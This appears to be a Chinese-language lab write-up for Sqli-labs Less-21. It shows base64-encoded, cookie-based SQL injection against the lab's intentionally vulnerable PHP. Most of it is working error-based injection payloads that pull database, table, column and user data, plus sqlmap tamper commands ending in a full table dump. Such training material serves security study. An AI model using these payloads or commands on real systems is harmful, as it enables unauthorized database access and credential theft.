@@ -1,0 +1,58 @@
+<hr>
+<h2 id="title-less21url-https-www-yuque-com-u29002979-ep2zrx-gpk8saglgv3g7wdc"><a href="#title-less21url-https-www-yuque-com-u29002979-ep2zrx-gpk8saglgv3g7wdc" class="headerlink" title="title: less21url: https://www.yuque.com/u29002979/ep2zrx/gpk8saglgv3g7wdc"></a>title: less21<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/gpk8saglgv3g7wdc">https://www.yuque.com/u29002979/ep2zrx/gpk8saglgv3g7wdc</a></h2><pre><code class="bash">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+
+$sql=&quot;SELECT * FROM users WHERE username=(&#39;$cookee&#39;) LIMIT 0,1&quot;;
+
+echo &quot; Your Cookie is deleted&quot;;
+                setcookie(&#39;uname&#39;, base64_encode($row1[&#39;username&#39;]), time()-3600);
+                header (&#39;Location: index.php&#39;);
+</code></pre>
+<p>闭合方式’)</p>
+<p>成功登录后发现在Cookie处登录的信息被进行了加密，</p>
+<blockquote>
+<p>YOUR USER AGENT IS : Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.0.0 Safari&#x2F;537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : <strong>uname &#x3D; YWRtaW4&#x3D;</strong> and expires: Wed 16 Nov 2022 - 20:04:08<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p>
+</blockquote>
+<p>说明在客户端登录的信息被进行了加密 &amp;#x20;<br>** base64解码**YWRtaW4&#x3D;为admin<br>可以尝试在每次注入前对payload进行加密再注入</p>
+<p><a name="DsPkr"></a></p>
+<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>uname=admin&#39; order by 4 -- +</code><br>先将语句进行base64加密，再进行注入，<br><code>uname=YWRtaW4nIG9yZGVyIGJ5IDQgLS0gKw==</code></p>
+<blockquote>
+<p>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 4 – +’) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>通过回显找到闭合方式为’)\ <a name="mqKGp"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">爆破数据库名
+uname=admin&#39;) union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +
+uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSktLSAr
+爆破数据表名
+uname=admin&#39;) union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)-- +
+uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgPSBkYXRhYmFzZSgpKSwweDdlKSwxKS0tICs=
+爆破字段名
+uname=admin&#39;) union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1)-- +
+uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyBsaW1pdCA4LDEpLDB4N2UpLDEpLS0gKw==
+爆破字段
+uname=admin&#39;) union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
+uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcm5hbWUgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLS0gKw==
+</code></pre>
+<p><a name="ImHDK"></a></p>
+<h1 id="sqlmap加密注入运用"><a href="#sqlmap加密注入运用" class="headerlink" title="sqlmap加密注入运用"></a>sqlmap加密注入运用</h1><p>将数据包头的内容重新粘贴到新的文档中，<br>在Cookie处标上*&amp;#x20;<br>启动sqlmap,对进行加密注入的数据需要用到tamper模块</p>
+<blockquote>
+<p><strong>–tamper&#x3D;”base64encode.py”</strong></p>
+</blockquote>
+<pre><code class="bash">GET /less-21/index.php HTTP/1.1
+Host: 192.168.31.193
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: uname=YWRtaW4%3D*
+Connection: close
+</code></pre>
+<pre><code class="bash">扫描
+sqlmap -r 3.txt --batch --level 3 --tamper=&quot;base64encode.py&quot;
+爆破数据库
+sqlmap -r 3.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; --current-db
+爆破表单
+sqlmap -r 3.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; -D security --tables
+脱库
+sqlmap -r 3.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; -D security -T users --dump
+</code></pre>
